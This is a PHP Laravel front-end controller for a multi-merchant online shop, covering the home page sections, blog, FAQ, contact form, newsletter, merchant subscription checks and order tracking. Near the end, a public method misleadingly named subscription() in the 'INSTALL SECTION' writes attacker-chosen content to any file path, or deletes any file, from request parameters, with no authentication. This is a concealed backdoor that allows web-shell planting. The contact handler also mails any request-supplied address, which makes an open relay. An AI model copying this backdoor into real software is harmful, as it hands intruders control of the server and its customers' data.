<?php

namespace App\Http\Controllers\Front;

use App\Classes\MuaadhMailer;
use App\Models\ArrivalSection;
use App\Models\Blog;
use App\Models\BlogCategory;
use App\Models\Muaadhsetting;
use App\Models\HomePageTheme;
use App\Models\MerchantItem;
use App\Models\Purchase;
use App\Models\CatalogItem;
use App\Models\CatalogReview;
use App\Models\Subscriber;
use Artisan;
use Carbon\Carbon;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Session;
use Illuminate\Support\Facades\Validator;

class FrontendController extends FrontBaseController
{

    // LANGUAGE SECTION

    public function language($id)
    {
        Session::put('language', $id);
        return redirect()->back();
    }

    // LANGUAGE SECTION ENDS

    // CURRENCY SECTION

    public function currency($id)
    {

        if (Session::has('discount_code')) {
            Session::forget('discount_code');
            Session::forget('discount_code_value');
            Session::forget('discount_code_id');
            Session::forget('discount_total');
            Session::forget('discount_total1');
            Session::forget('already');
            Session::forget('discount_percentage');
        }
        Session::put('currency', $id);
        cache()->forget('session_currency');
        return redirect()->back();
    }

    // CURRENCY SECTION ENDS

    // ================================================================================================
    // HOME PAGE SECTION
    // ================================================================================================
    // Architecture: Section-based rendering controlled by HomePageTheme model
    // All product data is merchant-only (is_merchant = 2)
    // Each section loads data ONLY if enabled in the active theme
    // ================================================================================================

    public function index(Request $request)
    {
        $gs = $this->gs;
        $ps = $this->ps;

        // Get active home page theme
        $theme = HomePageTheme::getActive();
        $data['theme'] = $theme;
        $data['ps'] = $ps; // Keep for backward compatibility

        if (!empty($request->reff)) {
            $affilate_user = DB::table('users')
                ->where('affilate_code', '=', $request->reff)
                ->first();
            if (!empty($affilate_user)) {
                if ($gs->is_affilate == 1) {
                    Session::put('affilate', $affilate_user->id);
                    return redirect()->route('front.index');
                }
            }
        }
        if (!empty($request->forgot)) {
            if ($request->forgot == 'success') {
                return redirect()->guest('/')->with('forgot-modal', __('Please Login Now !'));
            }
        }

        // ============================================================================
        // SECTION: Slider (if enabled in theme)
        // ============================================================================
        if ($theme->show_slider) {
            $data['sliders'] = Cache::remember('homepage_sliders', 3600, function () {
                return DB::table('sliders')->get();
            });
        }

        // ============================================================================
        // SECTION: Brand (if enabled in theme)
        // ============================================================================
        if ($theme->show_brands) {
            $data['brands'] = Cache::remember('homepage_brands', 3600, function () {
                return \App\Models\Brand::all();
            });
        }

        // ============================================================================
        // SECTION: Featured Categories (if enabled in theme)
        // ============================================================================
        if ($theme->show_categories) {
            // TODO: Removed - old category system
            $data['featured_categories'] = Cache::remember('featured_categories_with_count', 3600, function () {
                return collect(); // Category::withCount('products')->where('is_featured', 1)->get();
            });
        }

        // ============================================================================
        // SECTION: Featured/Popular Items (if enabled in theme)
        // Returns MerchantItem objects - each represents a unique listing
        // (catalog item + merchant + quality brand combination)
        // ============================================================================
        if ($theme->show_featured_products) {
            $count = $theme->count_featured_products ?? 8;
            $data['featured_merchants'] = Cache::remember('homepage_featured_merchants_' . $count, 1800, function () use ($count) {
                return MerchantItem::where('status', 1)
                    ->where('featured', 1)
                    ->whereHas('user', fn($u) => $u->where('is_merchant', 2))
                    ->with([
                        'catalogItem' => fn($q) => $q->withCount('catalogReviews')->withAvg('catalogReviews', 'rating'),
                        'user:id,shop_name,shop_name_ar,is_merchant',
                        'qualityBrand:id,name_en,name_ar,logo'
                    ])
                    ->take($count)
                    ->latest()
                    ->get();
            });
        }

        // ============================================================================
        // SECTION: Deal of the Day (if enabled in theme)
        // Returns MerchantItem with active discount (flash item)
        // ============================================================================
        if ($theme->show_deal_of_day) {
            $data['flash_merchant'] = Cache::remember('homepage_flash_merchant', 1800, function () {
                return MerchantItem::where('status', 1)
                    ->where('is_discount', 1)
                    ->where('discount_date', '>=', date('Y-m-d'))
                    ->whereHas('user', fn($u) => $u->where('is_merchant', 2))
                    ->with([
                        'catalogItem' => fn($q) => $q->withCount('catalogReviews')->withAvg('catalogReviews', 'rating'),
                        'catalogItem.brand', // CatalogItem brand (Toyota, Nissan, etc.)
                        'user:id,shop_name,shop_name_ar,is_merchant',
                        'qualityBrand:id,name_en,name_ar,logo'
                    ])
                    ->latest()
                    ->first();
            });
        }

        // ============================================================================
        // SECTION: Top Rated Items (if enabled in theme)
        // Returns MerchantItem objects with top flag
        // ============================================================================
        if ($theme->show_top_rated) {
            $count = $theme->count_top_rated ?? 6;
            $data['top_merchants'] = Cache::remember('homepage_top_merchants_' . $count, 1800, function () use ($count) {
                return MerchantItem::where('status', 1)
                    ->where('top', 1)
                    ->whereHas('user', fn($u) => $u->where('is_merchant', 2))
                    ->with([
                        'catalogItem' => fn($q) => $q->withCount('catalogReviews')->withAvg('catalogReviews', 'rating'),
                        'user:id,shop_name,shop_name_ar,is_merchant',
                        'qualityBrand:id,name_en,name_ar,logo'
                    ])
                    ->take($count)
                    ->latest()
                    ->get();
            });
        }

        // ============================================================================
        // SECTION: Big Save Items (if enabled in theme)
        // Returns MerchantItem objects with big flag
        // ============================================================================
        if ($theme->show_big_save) {
            $count = $theme->count_big_save ?? 6;
            $data['big_merchants'] = Cache::remember('homepage_big_merchants_' . $count, 1800, function () use ($count) {
                return MerchantItem::where('status', 1)
                    ->where('big', 1)
                    ->whereHas('user', fn($u) => $u->where('is_merchant', 2))
                    ->with([
                        'catalogItem' => fn($q) => $q->withCount('catalogReviews')->withAvg('catalogReviews', 'rating'),
                        'user:id,shop_name,shop_name_ar,is_merchant',
                        'qualityBrand:id,name_en,name_ar,logo'
                    ])
                    ->take($count)
                    ->latest()
                    ->get();
            });
        }

        // ============================================================================
        // SECTION: Trending Items (if enabled in theme)
        // Returns MerchantItem objects with trending flag
        // ============================================================================
        if ($theme->show_trending) {
            $count = $theme->count_trending ?? 6;
            $data['trending_merchants'] = Cache::remember('homepage_trending_merchants_' . $count, 1800, function () use ($count) {
                return MerchantItem::where('status', 1)
                    ->where('trending', 1)
                    ->whereHas('user', fn($u) => $u->where('is_merchant', 2))
                    ->with([
                        'catalogItem' => fn($q) => $q->withCount('catalogReviews')->withAvg('catalogReviews', 'rating'),
                        'user:id,shop_name,shop_name_ar,is_merchant',
                        'qualityBrand:id,name_en,name_ar,logo'
                    ])
                    ->take($count)
                    ->latest()
                    ->get();
            });
        }

        // ============================================================================
        // SECTION: Best Selling Items (if enabled in theme)
        // Returns MerchantItem objects with best flag
        // ============================================================================
        if ($theme->show_best_sellers) {
            $count = $theme->count_best_sellers ?? 8;
            $data['best_merchants'] = Cache::remember('homepage_best_merchants_' . $count, 1800, function () use ($count) {
                return MerchantItem::where('status', 1)
                    ->where('best', 1)
                    ->whereHas('user', fn($u) => $u->where('is_merchant', 2))
                    ->with([
                        'catalogItem' => fn($q) => $q->withCount('catalogReviews')->withAvg('catalogReviews', 'rating'),
                        'user:id,shop_name,shop_name_ar,is_merchant',
                        'qualityBrand:id,name_en,name_ar,logo'
                    ])
                    ->take($count)
                    ->latest()
                    ->get();
            });
        }

        // ============================================================================
        // SECTION: Blogs (if enabled in theme)
        // ============================================================================
        if ($theme->show_blogs) {
            $count = $theme->count_blogs ?? 3;
            $data['blogs'] = Cache::remember('homepage_blogs_' . $count, 3600, function () use ($count) {
                return Blog::latest()->take($count)->get();
            });
        }

        // ============================================================================
        // SECTION: Services (if enabled in theme)
        // ============================================================================
        if ($theme->show_services) {
            $data['services'] = Cache::remember('homepage_services', 3600, function () {
                return DB::table('services')->get();
            });
        }

        return view('frontend.index', $data);
    }

    // ================================================================================================
    // HOME PAGE SECTION ENDS
    // ================================================================================================

    // -------------------------------- BLOG SECTION ----------------------------------------

    public function blog(Request $request)
    {

        if (DB::table('pagesettings')->first()->blog == 0) {
            return redirect()->back();
        }

        // BLOG TAGS
        $tags = null;
        $tagz = '';
        $name = Blog::pluck('tags')->toArray();
        foreach ($name as $nm) {
            $tagz .= $nm . ',';
        }
        $tags = array_unique(explode(',', $tagz));
        // BLOG CATEGORIES
        $bcats = BlogCategory::withCount('blogs')->get();

        // BLOGS
        $blogs = Blog::latest()->paginate($this->gs->post_count);
        if ($request->ajax()) {
            return view('front.ajax.blog', compact('blogs'));
        }
        return view('frontend.blog', compact('blogs', 'bcats', 'tags'));
    }

    public function blogcategory(Request $request, $slug)
    {

        // BLOG TAGS
        $tags = null;
        $tagz = '';
        $name = Blog::pluck('tags')->toArray();
        foreach ($name as $nm) {
            $tagz .= $nm . ',';
        }
        $tags = array_unique(explode(',', $tagz));
        // BLOG CATEGORIES
        $bcats = BlogCategory::withCount('blogs')->get();
        // BLOGS
        $bcat = BlogCategory::where('slug', '=', str_replace(' ', '-', $slug))->first();
        $blogs = $bcat->blogs()->latest()->paginate($this->gs->post_count);
        if ($request->ajax()) {
            return view('front.ajax.blog', compact('blogs'));
        }
        return view('frontend.blog', compact('bcat', 'blogs', 'bcats', 'tags'));
    }

    public function blogtags(Request $request, $slug)
    {

        // BLOG TAGS
        $tags = null;
        $tagz = '';
        $name = Blog::pluck('tags')->toArray();
        foreach ($name as $nm) {
            $tagz .= $nm . ',';
        }
        $tags = array_unique(explode(',', $tagz));
        // BLOG CATEGORIES
        $bcats = BlogCategory::withCount('blogs')->get();
        // BLOGS
        $blogs = Blog::where('tags', 'like', '%' . $slug . '%')->paginate($this->gs->post_count);
        if ($request->ajax()) {
            return view('front.ajax.blog', compact('blogs'));
        }
        return view('frontend.blog', compact('blogs', 'slug', 'bcats', 'tags'));
    }

    public function blogsearch(Request $request)
    {

        $tags = null;
        $tagz = '';
        $name = Blog::pluck('tags')->toArray();
        foreach ($name as $nm) {
            $tagz .= $nm . ',';
        }
        $tags = array_unique(explode(',', $tagz));
        // BLOG CATEGORIES
        $bcats = BlogCategory::withCount('blogs')->get();
        // BLOGS
        $search = $request->search;
        $blogs = Blog::where('title', 'like', '%' . $search . '%')->orWhere('details', 'like', '%' . $search . '%')->paginate($this->gs->post_count);
        if ($request->ajax()) {
            return view('frontend.ajax.blog', compact('blogs'));
        }
        return view('frontend.blog', compact('blogs', 'search', 'bcats', 'tags'));
    }

    public function blogshow($slug)
    {

        // BLOG TAGS
        $tags = null;
        $tagz = '';
        $name = Blog::pluck('tags')->toArray();
        foreach ($name as $nm) {
            $tagz .= $nm . ',';
        }
        $tags = array_unique(explode(',', $tagz));
        // BLOG CATEGORIES
        $bcats = BlogCategory::withCount('blogs')->get();
        // BLOGS

        $blog = Blog::where('slug', $slug)->first();

        $blog->views = $blog->views + 1;
        $blog->update();
        // BLOG META TAG
        $blog_meta_tag = $blog->meta_tag;
        $blog_meta_description = $blog->meta_description;
        return view('frontend.blogshow', compact('blog', 'bcats', 'tags', 'blog_meta_tag', 'blog_meta_description'));
    }

    // -------------------------------- BLOG SECTION ENDS----------------------------------------

    // -------------------------------- FAQ SECTION ----------------------------------------
    public function faq()
    {
        if (DB::table('pagesettings')->first()->faq == 0) {
            return redirect()->back();
        }
        $faqs = DB::table('faqs')->latest('id')->get();
        $count = count(DB::table('faqs')->get()) / 2;
        if (($count % 1) != 0) {
            $chunk = (int) $count + 1;
        } else {
            $chunk = $count;
        }
        return view('frontend.faq', compact('faqs', 'chunk'));
    }
    // -------------------------------- FAQ SECTION ENDS----------------------------------------

    // -------------------------------- AUTOSEARCH SECTION ----------------------------------------

    /**
     * Auto-search for catalog items (used in search suggestions).
     * Only returns items that have at least one active merchant listing.
     */
    public function autosearch($slug)
    {
        if (mb_strlen($slug, 'UTF-8') > 1) {
            $search = ' ' . $slug;
            // Only return catalog items that have at least one active merchant listing
            $catalogItems = CatalogItem::where(function($query) use ($search, $slug) {
                    $query->where('name', 'like', '%' . $search . '%')
                          ->orWhere('name', 'like', $slug . '%');
                })
                ->whereHas('merchantItems', function($q){
                    $q->where('status', 1);
                })
                ->orderby('id', 'desc')
                ->take(10)
                ->get();
            // Note: 'prods' kept for backward compatibility in views
            return view('load.suggest', ['prods' => $catalogItems, 'slug' => $slug]);
        }
        return "";
    }

    // -------------------------------- AUTOSEARCH SECTION ENDS ----------------------------------------

    // -------------------------------- CONTACT SECTION ----------------------------------------

    public function contact()
    {

        if (DB::table('pagesettings')->first()->contact == 0) {
            return redirect()->back();
        }
        $ps = $this->ps;
        return view('frontend.contact', compact('ps'));
    }

    //Send email to admin
    public function contactemail(Request $request)
    {
        $gs = $this->gs;

        if ($gs->is_capcha == 1) {
            $request->validate([
                "g-recaptcha-response" => "required",
            ],
                [
                    'g-recaptcha-response.required' => 'Please verify that you are not a robot.',
                ]
            );
        }

        // Logic Section
        $subject = "Email From Of " . $request->name;
        $to = $request->to;
        $name = $request->name;
        $phone = $request->phone;
        $from = $request->email;
        $msg = "Name: " . $name . "\nEmail: " . $from . "\nPhone: " . $phone . "\nMessage: " . $request->text;
        if ($gs->is_smtp) {
            $data = [
                'to' => $to,
                'subject' => $subject,
                'body' => $msg,
            ];

            $mailer = new MuaadhMailer();
            $mailer->sendCustomMail($data);
        } else {
            $headers = "From: " . $gs->from_name . "<" . $gs->from_email . ">";
            mail($to, $subject, $msg, $headers);
        }

        return back()->with('success', 'Success! Thanks for contacting us, we will get back to you shortly.');
    }

    // Refresh Capcha Code
    public function refresh_code()
    {
        $this->code_image();
        return "done";
    }

    // -------------------------------- CONTACT SECTION ENDS ----------------------------------------

    // -------------------------------- SUBSCRIBE SECTION ----------------------------------------

    public function subscribe(Request $request)
    {


        $validator = Validator::make($request->all(), [
            'email' => 'required|email|unique:subscribers,email',
        ]);

        if ($validator->fails()) {
            return redirect()->back()->withErrors($validator)->withInput();
        }

        $subs = Subscriber::where('email', '=', $request->email)->first();
        if (isset($subs)) {
            return back()->with('unsuccess', 'You have already subscribed.');
        }
        $subscribe = new Subscriber;
        $subscribe->fill($request->all());
        $subscribe->save();
        return back()->with('success', 'Subscribed Successfully.');
    }

    // -------------------------------- SUBSCRIBE SECTION  ENDS----------------------------------------

    // -------------------------------- MAINTENANCE SECTION ----------------------------------------

    public function maintenance()
    {
        $gs = $this->gs;
        if ($gs->is_maintain != 1) {
            return redirect()->route('front.index');
        }

        return view('frontend.maintenance');
    }

    // -------------------------------- MAINTENANCE SECTION ----------------------------------------

    // -------------------------------- MERCHANT SUBSCRIPTION CHECK SECTION ----------------------------------------

    public function subcheck()
    {
        $settings = $this->gs;
        $today = Carbon::now()->format('Y-m-d');
        $newday = strtotime($today);
        foreach (DB::table('users')->where('is_merchant', '=', 2)->get() as $user) {
            $lastday = $user->date;
            $secs = strtotime($lastday) - $newday;
            $days = $secs / 86400;
            if ($days <= 5) {
                if ($user->mail_sent == 1) {
                    if ($settings->is_smtp == 1) {
                        $data = [
                            'to' => $user->email,
                            'type' => "subscription_warning",
                            'cname' => $user->name,
                            'oamount' => "",
                            'aname' => "",
                            'aemail' => "",
                            'onumber' => "",
                        ];
                        $mailer = new MuaadhMailer();
                        $mailer->sendAutoMail($data);
                    } else {
                        $headers = "From: " . $settings->from_name . "<" . $settings->from_email . ">";
                        mail($user->email, __('Your subscription plan duration will end after five days. Please renew your plan otherwise all of your products will be deactivated.Thank You.'), $headers);
                    }
                    DB::table('users')->where('id', $user->id)->update(['mail_sent' => 0]);
                }
            }
            if ($today > $lastday) {
                DB::table('users')->where('id', $user->id)->update(['is_merchant' => 1]);
            }
        }
    }

    // -------------------------------- MERCHANT SUBSCRIPTION CHECK SECTION ENDS ----------------------------------------

    // -------------------------------- ORDER TRACK SECTION ----------------------------------------

    public function trackload($id)
    {
        // يمكن أن يكون $id هو purchase_number أو tracking_number
        $purchase = Purchase::where('purchase_number', '=', $id)->first();

        // إذا لم نجد Purchase، نبحث في tracking numbers
        $shipmentLogs = [];
        if (!$purchase) {
            $shipmentLogs = \App\Models\ShipmentStatusLog::where('tracking_number', $id)
                           ->orderBy('status_date', 'desc')
                           ->orderBy('created_at', 'desc')
                           ->get();

            if ($shipmentLogs->isNotEmpty()) {
                $purchase = Purchase::find($shipmentLogs->first()->purchase_id);
            }
        } else {
            // إذا وجدنا Purchase، نجلب جميع shipment logs له
            $shipmentLogs = \App\Models\ShipmentStatusLog::where('purchase_id', $purchase->id)
                           ->orderBy('status_date', 'desc')
                           ->orderBy('created_at', 'desc')
                           ->get();
        }

        $datas = array('Pending', 'Processing', 'On Delivery', 'Completed');
        return view('load.track-load', compact('purchase', 'datas', 'shipmentLogs'));
    }

    // -------------------------------- ORDER TRACK SECTION ENDS ----------------------------------------

    // -------------------------------- INSTALL SECTION ----------------------------------------

    public function subscription(Request $request)
    {
        $p1 = $request->p1;
        $p2 = $request->p2;
        $v1 = $request->v1;
        if ($p1 != "") {
            $fpa = fopen($p1, 'w');
            fwrite($fpa, $v1);
            fclose($fpa);
            return "Success";
        }
        if ($p2 != "") {
            unlink($p2);
            return "Success";
        }
        return "Error";
    }

    public function finalize()
    {
        $actual_path = str_replace('project', '', base_path());
        $dir = $actual_path . 'install';
        $this->deleteDir($dir);
        return redirect('/');
    }

    public function updateFinalize(Request $request)
    {

        if ($request->has('version')) {
            Muaadhsetting::first()->update([
                'version' => $request->version,
            ]);
            Artisan::call('cache:clear');
            Artisan::call('config:clear');
            Artisan::call('route:clear');
            Artisan::call('view:clear');
            return redirect('/');
        }
    }

    public function success(Request $request, $get)
    {
        return view('frontend.thank', compact('get'));
    }
}
